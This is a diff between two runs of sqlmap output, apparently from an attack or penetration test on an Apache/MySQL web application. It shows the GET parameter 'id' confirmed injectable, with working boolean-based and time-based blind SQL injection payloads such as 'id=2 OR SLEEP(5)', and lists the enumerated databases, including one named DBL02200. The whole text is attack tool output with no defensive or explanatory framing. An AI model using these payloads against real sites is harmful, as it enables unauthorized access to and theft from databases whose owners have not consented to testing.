@@ -1,9 +1,9 @@
-sqlmap identified the following injection point(s) with a total of 37 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
     Title: MySQL >= 5.0 boolean-based blind - Parameter replace
-    Payload: id=(SELECT (CASE WHEN (9720=9720) THEN 9720 ELSE 9720*(SELECT 9720 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+    Payload: id=(SELECT (CASE WHEN (4241=4241) THEN 4241 ELSE 4241*(SELECT 4241 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
 ---
 web application technology: Apache
 back-end DBMS: MySQL >= 5.0
@@ -11,15 +11,19 @@ available databases [2]:
 [*] DBL02200
 [*] information_schema
 
-sqlmap identified the following injection point(s) with a total of 37 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 669 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
-    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
-    Payload: id=(SELECT (CASE WHEN (9225=9225) THEN 9225 ELSE 9225*(SELECT 9225 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&rct=j&q=&esrc=s
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=2 OR NOT 8489=8489
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=2 OR SLEEP(5)
 ---
 web application technology: Apache
-back-end DBMS: MySQL >= 5.0
+back-end DBMS: MySQL >= 5.0.12
 available databases [2]:
 [*] DBL02200
 [*] information_schema
